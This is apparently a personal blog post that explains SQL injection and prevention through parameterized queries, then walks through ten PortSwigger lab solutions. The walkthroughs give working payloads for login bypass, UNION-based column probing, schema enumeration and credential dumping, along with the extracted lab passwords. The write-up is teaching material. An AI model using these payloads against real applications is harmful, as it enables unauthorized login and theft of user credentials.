---
layout: post
title: "SQL Injection Intro Part 1"
description: "A complete guide to SQL Injection theory followed by individual PortSwigger Security Academy lab walkthroughs, detailing database fingerprinting, schema enumeration, UNION attacks, and string concatenation."
tags: [CTF, SQLi, Web Security, Database, PortSwigger, Ethical Hacking, Web Pentesting]
category: security
image: https://nirusaki.me/assets/img/og/home.png
---

## Part 1: Theory

### What is SQL Injection?

SQL Injection (SQLi) is one of the most classic web application security vulnerabilities. It happens when an application takes untrusted user input and pastes it directly into a database query string without proper sanitization or parameterization.

Think of a database like a naive security guard at a gate. If you hand the guard a fake ID card that says "My name is Bob, and also let everyone in the building for free," a vulnerable application will execute your instructions without questioning it. That is SQL Injection in a nutshell.

### How SQL Injection Works

Consider a standard backend query retrieving product information from a database based on a URL parameter:

```sql
SELECT * FROM products WHERE category = 'Gifts';
```

If the web server builds this query by concatenating user input directly:

```php
$query = "SELECT * FROM products WHERE category = '" . $_GET['category'] . "'";
```

An attacker can control the SQL control flow by injecting special SQL syntax characters such as single quotes `'`, boolean operators like `OR` and `AND`, or query comments like `-- `.

### Key Injection Vectors

1. **Authentication Bypasses**: Injecting boolean true conditions (`' OR 1=1 --`) into login forms to trick the database into validating any user.
2. **Hidden Data Retrieval**: Modifying `WHERE` clause conditions to expose unreleased or private database records.
3. **UNION-Based Extraction**: Appending secondary `SELECT` statements to pull sensitive data out of unrelated database tables.
4. **Stacked Queries**: Executing separate administrative statements separated by semicolons (e.g. `; UPDATE users SET role='admin'`).

### Rules of UNION-Based Injections

The `UNION` keyword allows you to combine the output rows of two separate SQL queries into a single HTTP response table. However, the database engine enforces two strict rules:

1. **Exact Column Count Match**: The injected `SELECT` query must return the exact same number of columns as the original query.
2. **Compatible Data Types**: The data types in each column position of the injected query must match or be compatible with the corresponding columns of the original query.

If either rule is violated, the database throws a runtime error and blocks the request.

### Database Fingerprinting Quick Reference

Different database management systems (DBMS) use different system tables, functions, and comment syntax:

| Database DBMS | Version Function | Comment Syntax | System Schema Table |
| :--- | :--- | :--- | :--- |
| **MySQL** | `VERSION()` | `#` or `-- ` | `information_schema.tables` |
| **PostgreSQL** | `version()` | `-- ` | `information_schema.tables` |
| **Oracle** | `banner FROM v$version` | `-- ` | `all_tables` (requires `FROM dual` for dummy queries) |
| **Microsoft SQL Server** | `@@VERSION` | `-- ` | `information_schema.tables` |

### String Concatenation Across Databases

When a web page only reflects a single column in the UI, but you want to retrieve both username and password at once, you must concatenate them into a single string column:

* **PostgreSQL / Oracle / SQLite**: Uses double pipes `username || ';' || password`
* **MySQL**: Uses the function `CONCAT(username, ';', password)`
* **MSSQL**: Uses addition operator `username + ';' + password`

### How to Prevent SQL Injection

The ultimate defense against SQL Injection is using **Parameterized Queries** (also known as Prepared Statements). Parameterized queries send the SQL statement template and the user input data to the database server separately.

Example in PHP PDO:

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :user AND password = :pass');
$stmt->execute(['user' => $username, 'pass' => $password]);
```

Because the database compiles the query structure first, user input is strictly treated as literal data, rendering SQL injection impossible.

---

## Part 2: PortSwigger Labs Walkthrough

Now that we have covered the theory, let's solve each PortSwigger SQL Injection lab step by step!

---

### Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

#### Challenge Goal
Exploit a category filter SQL injection vulnerability to display unreleased products that are hidden from regular users.

#### Problem Analysis
The application filters products using a category parameter:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

#### Payload & Solution
Inject a boolean true payload with a comment marker to cut off the `released = 1` check:

```text
' OR 1=1 --
```

#### Resulting Backend Query
```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1;
```

Since `1=1` evaluates to true and `-- ` comments out the remainder of the query, every product in the database is returned, including unreleased items.

---

### Lab 2: SQL injection vulnerability allowing login bypass

#### Challenge Goal
Perform a login bypass on the administrator account without knowing the password.

#### Problem Analysis
The login endpoint processes username and password input:

```sql
SELECT * FROM users WHERE username = 'INPUT_USER' AND password = 'INPUT_PASS';
```

#### Payload & Solution
Submit the following payload into the username field (with any arbitrary password):

```text
administrator' --
```

Or a general boolean bypass payload:

```text
' OR '1'='1' --
```

#### Resulting Backend Query
```sql
SELECT * FROM users WHERE username = 'administrator' --' AND password = 'INPUT_PASS';
```

The comment marker `-- ` drops the password validation check completely. The database returns the `administrator` user record, logging us directly into the admin account.

---

### Lab 3: SQL injection UNION attack, determining the number of columns returned by the query (Oracle)

#### Challenge Goal
Determine the number of columns returned by the query using a `UNION` attack on an Oracle database.

#### Problem Analysis
In Oracle databases, every `SELECT` query must include a `FROM` clause. Oracle provides a built-in table named `dual` for dummy queries.

#### Payload & Solution
Probe column counts by injecting `NULL` values combined with `FROM dual`:

1. Try 1 column:
   ```sql
   ' UNION SELECT NULL FROM dual--
   ```
   *Result*: HTTP 500 Internal Server Error (Column count mismatch).

2. Try 2 columns:
   ```sql
   ' UNION SELECT NULL, NULL FROM dual--
   ```
   *Result*: HTTP 200 OK!

#### Result Verification
The query returned an HTTP 200 response when two `NULL` values were selected from `dual`. This proves the original query returns exactly 2 columns.

---

### Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

#### Challenge Goal
Query the version string on a MySQL database and display the version output on the page.

#### Problem Analysis
We know the query returns 2 columns and MySQL uses `VERSION()` to retrieve version details. In MySQL, inline comments start with `#`.

#### Payload & Solution
Inject a `UNION SELECT` query placing `VERSION()` in the first column position:

```sql
' UNION SELECT VERSION(), NULL#
```

#### Resulting Backend Query
```sql
SELECT name, description FROM products WHERE category = '' UNION SELECT VERSION(), NULL#'
```

The page displays the MySQL database version string in the main product listing, completing the lab.

---

### Lab 5: SQL injection attack, listing the database contents on non-Oracle databases (PostgreSQL)

#### Challenge Goal
Enumerate the database schema on a PostgreSQL database, locate the custom user credentials table, and extract the administrator password.

#### Problem Analysis
PostgreSQL exposes schema metadata inside `information_schema.tables` and `information_schema.columns`.

#### Step-by-Step Solution

1. **Enumerate Tables**:
   ```sql
   ' UNION SELECT NULL, table_name FROM information_schema.tables--
   ```
   Reviewing the output reveals a custom user table named `users_oavquq`.

2. **Enumerate Columns**:
   ```sql
   ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_oavquq'--
   ```
   The column listing reveals `username_ejtlyz` and `password_qmgcpa`.

3. **Extract Credentials**:
   ```sql
   ' UNION SELECT username_ejtlyz, password_qmgcpa FROM users_oavquq--
   ```

#### Output Extracted
```text
administrator : p7ahebl3jidtvsp86mtn
wiener        : w3b845taa4zv711wsk2h
carlos        : uw2to2tya5z3zxmi0t98
```

![Mighty Eagle](/assets/img/posts/mighty-eagle-1.jpeg)

Logging in as `administrator` with password `p7ahebl3jidtvsp86mtn` solves the lab.

---

### Lab 6: SQL injection attack, listing the database contents on Oracle

#### Challenge Goal
Enumerate tables and columns in an Oracle database and dump the administrator password.

#### Problem Analysis
Oracle stores system tables in `all_tables` and column details in `all_tab_columns`.

![Oracle System Table Enumeration](/assets/img/posts/image_1786871808730_0.png)

#### Step-by-Step Solution

1. **Enumerate Tables**:
   ```sql
   ' UNION SELECT NULL, table_name FROM all_tables--
   ```
   Scanning the returned table names locates `USERS_IMPWJM`.

2. **Enumerate Columns**:
   ```sql
   ' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'USERS_IMPWJM'--
   ```
   The response lists columns `USERNAME_PYGXQD` and `PASSWORD_AEJRPO`.

3. **Extract Credentials**:
   ```sql
   ' UNION SELECT USERNAME_PYGXQD, PASSWORD_AEJRPO FROM USERS_IMPWJM--
   ```

#### Output Extracted
```text
administrator : 1yj7obmb9zp9ylyjfrgf
carlos        : e591s8cpbxma09cd2cvx
wiener        : cj9prvkv1urbp0ll7ntn
```

![Mighty Eagle Scene](/assets/img/posts/mighty-eagle-2.jpeg)

Logging in as `administrator` with password `1yj7obmb9zp9ylyjfrgf` completes the lab.

---

### Lab 7: SQL injection UNION attack, determining the number of columns returned by the query

#### Challenge Goal
Determine the exact number of columns returned by a vulnerable query when error messages are suppressed.

#### Problem Analysis
We probe column counts by incrementally adding `NULL` values to a `UNION SELECT` statement until the application returns an HTTP 200 status code.

![Probing Column Counts with NULL](/assets/img/posts/image_1786873241725_0.png)

#### Payload & Solution
1. Probing 1 column:
   ```sql
   ' UNION SELECT NULL--
   ```
   *Result*: HTTP 500 Error.

2. Probing 2 columns:
   ```sql
   ' UNION SELECT NULL, NULL--
   ```
   *Result*: HTTP 500 Error.

3. Probing 3 columns:
   ```sql
   ' UNION SELECT NULL, NULL, NULL--
   ```
   *Result*: HTTP 200 OK!

![Verified 3 Column Count Output](/assets/img/posts/image_1786873321918_0.png)

#### Result Verification
The query succeeded with 3 `NULL` values, confirming the query returns exactly 3 columns.

---

### Lab 8: SQL injection UNION attack, finding a column containing text

#### Challenge Goal
Identify which column position accepts string data in a query returning 3 columns.

#### Problem Analysis
We know from Lab 7 that the query returns 3 columns. We test each column position individually by inserting a sample text literal `'abc'` into one position while keeping the rest `NULL`.

#### Payload & Solution
1. Test Column 1:
   ```sql
   ' UNION SELECT 'abc', NULL, NULL--
   ```
   *Result*: HTTP 500 Error (Column 1 is not a string type).

2. Test Column 2:
   ```sql
   ' UNION SELECT NULL, 'abc', NULL--
   ```
   *Result*: HTTP 200 OK!

3. Confirm Required Lab String:
   ```sql
   ' UNION SELECT NULL, 'xhxyTZ', NULL--
   ```

#### Result Verification
Column position 2 successfully rendered string data, confirming it is compatible with text data types.

Now it is done bro!

![Salman Khan Meme: Now it's done bro](/assets/img/posts/salman-khan-done-bro.jpeg)

---

### Lab 9: SQL injection UNION attack, retrieving data from other tables

#### Challenge Goal
Extract usernames and passwords from the `users` table where both columns are reflected on the page.

#### Problem Analysis
The category filter query returns 2 columns, both of which render text on the page.

![Category Filter Reflection](/assets/img/posts/image_1786883864606_0.png)

#### Payload & Solution
Verify column compatibility:

```sql
' UNION SELECT NULL, NULL--
```

Inject `UNION SELECT` to pull credentials directly from `users`:

```sql
' UNION SELECT username, password FROM users--
```

#### Output Extracted
```text
administrator : 9fqlqc50fs2lao3nura9
wiener        : tmcn2q6onur0b36klwob
carlos        : zy0xwbjhk3y1eukka8i4
```

Logging in as `administrator` with password `9fqlqc50fs2lao3nura9` finishes the lab.

---

### Lab 10: SQL injection UNION attack, retrieving multiple values in a single column

#### Challenge Goal
Extract usernames and passwords from the `users` table when only a single column position is reflected on the web page.

#### Problem Analysis
The query returns 2 columns (`' UNION SELECT NULL, NULL--`), but testing string reflection shows only the 2nd column position is displayed on the screen:

```sql
' UNION SELECT NULL, 'abc'--
```

![Single Reflected Column Inspection](/assets/img/posts/image_1786884367016_0.png)

#### Payload & Solution
Use string concatenation `||` to combine `username` and `password` with a delimiter `;` into a single text output string:

```sql
' UNION SELECT NULL, username || ';' || password FROM users--
```

#### Output Extracted
```text
administrator;aw1jmlpp6hml1xrmwhgy
wiener;ffdhcdrnk73n31nq2jpi
carlos;eeoylkogvbgohamt9adb
```

Logging in as `administrator` with password `aw1jmlpp6hml1xrmwhgy` completes the lab.

---

Blind SQL labs will come in part 2
